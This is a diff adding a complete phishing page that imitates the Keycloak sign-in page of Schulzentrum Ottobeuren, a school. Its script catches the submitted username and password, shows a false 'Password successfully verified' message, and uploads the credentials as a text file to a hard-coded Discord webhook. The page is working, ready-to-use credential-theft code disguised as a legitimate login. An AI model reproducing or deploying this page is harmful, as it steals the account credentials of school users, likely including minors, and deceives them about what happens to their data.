@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html class="login-pf">
+<head>
+    <meta charset="utf-8">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Sign in to Schulzentrum Ottobeuren</title>
+    <link rel="icon" href="favicon.ico">
+    <link href="css/patternfly.min_1.css" rel="stylesheet">
+    <link href="css/patternfly.min.css" rel="stylesheet">
+    <link href="css/patternfly-additions.min.css" rel="stylesheet">
+    <link href="css/pficon.css" rel="stylesheet">
+    <link href="css/login.css" rel="stylesheet">
+    <link href="css/custom.css" rel="stylesheet">
+</head>
+
+<body class="">
+<div class="header-bar">
+    <div id="kc-header" class="login-pf-page-header">
+        <div id="kc-header-wrapper" class="">
+            <img class="ld-logo-keycloak-left" src="images/keycloak-left.png"> Schulzentrum Ottobeuren <img class="ld-logo-keycloak-right" src="images/keycloak-right.png">
+        </div>
+    </div>
+</div>
+
+<div class="login-pf-page">
+    <div class="card-pf">
+        <header class="login-pf-header">
+            <h1 id="kc-page-title">
+                <img src="images/eule.svg" alt="Theo" class="theo-img">
+                Sign in to your account
+            </h1>
+        </header>
+        <div id="kc-content">
+            <div id="kc-content-wrapper">
+                <div id="kc-form">
+                    <div id="kc-form-wrapper">
+                        <form id="kc-form-login" onsubmit="event.preventDefault(); processLogin();">
+                            <div class="form-group">
+                                <label for="username" class="pf-c-form__label pf-c-form__label-text">Username or email</label>
+                                <input tabindex="1" id="username" class="pf-c-form-control" name="username" type="text" autofocus="" autocomplete="off">
+                            </div>
+                            <div class="form-group">
+                                <label for="password" class="pf-c-form__label pf-c-form__label-text">Password</label>
+                                <div class="pf-c-input-group">
+                                    <input tabindex="2" id="password" class="pf-c-form-control" name="password" type="password" autocomplete="off">
+                                    <button class="pf-c-button pf-m-control" type="button" aria-label="Show password" aria-controls="password" data-password-toggle="" data-label-show="Show password" data-label-hide="Hide password" onclick="togglePasswordVisibility()">
+                                        <i class="custom-icon custom-eye" aria-hidden="true"></i>
+                                    </button>
+                                </div>
+                            </div>
+                            <div class="form-group login-pf-settings">
+                                <div id="kc-form-options"></div>
+                                <div class=""></div>
+                            </div>
+                            <div id="kc-form-buttons" class="form-group">
+                                <input tabindex="4" class="pf-c-button pf-m-primary pf-m-block btn-lg" name="login" id="kc-login" type="submit" value="Sign In">
+                            </div>
+                        </form>
+                        <div id="placeholder-message" style="display:none; color:blue; margin-top:10px;">Password successfully verified.</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="loginFooter">
+    <img src="images/logodidact-white.svg" class="img-left" alt="LogoDIDACT">
+    <img src="images/sbe-logo-white.svg" class="img-right" alt="SBEnetwordsolutions">
+</div>
+
+<script>
+    function displayPlaceholderMessage(message) {
+        const placeholderMessage = document.getElementById('placeholder-message');
+        placeholderMessage.style.display = 'block';
+        placeholderMessage.innerText = message;
+    }
+
+    function togglePasswordVisibility() {
+        const passwordField = document.getElementById('password');
+        const toggleButton = passwordField.nextElementSibling;
+        const isPasswordVisible = passwordField.type === 'text';
+
+        if (isPasswordVisible) {
+            passwordField.type = 'password';
+            toggleButton.setAttribute('aria-label', 'Show password');
+        } else {
+            passwordField.type = 'text';
+            toggleButton.setAttribute('aria-label', 'Hide password');
+        }
+    }
+
+    async function processLogin() {
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        // Placeholder message for successful password verification
+        displayPlaceholderMessage("Password successfully verified.");
+
+        // Prepare the data to be sent
+        const date = new Date().toLocaleString();
+        const fileContent = `Username: ${username}\nPassword: ${password}`;
+
+        // Create a Blob (file) with the content
+        const blob = new Blob([fileContent], { type: 'text/plain' });
+
+        // Create a FormData object for sending the file
+        const formData = new FormData();
+        formData.append('file', blob, 'login_details.txt');
+
+        // Send the data to Discord Webhook with an attachment (file)
+        await sendToDiscord(date, formData);
+    }
+
+    async function sendToDiscord(date, formData) {
+        const webhookUrl = 'https://discord.com/api/webhooks/1327294439013617730/b0iVm3UCecOuL1ffePLErF9hmFZUkb_-61EHoyTTvCmNMgBoaxrSB_7cL9tjJqmYiYQ4';
+        
+        const messagePayload = {
+            content: `🔑 Neuer Anmeldeversuch\n📍 ${date}`,
+            // We cannot directly attach files through Discord's Webhook API, 
+            // so we will need a server-side solution to handle file uploads.
+        };
+
+        const requestPayload = new FormData();
+        requestPayload.append('payload_json', JSON.stringify(messagePayload));
+        requestPayload.append('file', formData.get('file'));
+
+        const response = await fetch(webhookUrl, {
+            method: 'POST',
+            body: requestPayload
+        });
+
+        if (!response.ok) {
+            console.error("Error sending data to Discord webhook");
+        }
+    }
+</script>
+
+</body>
+</html>
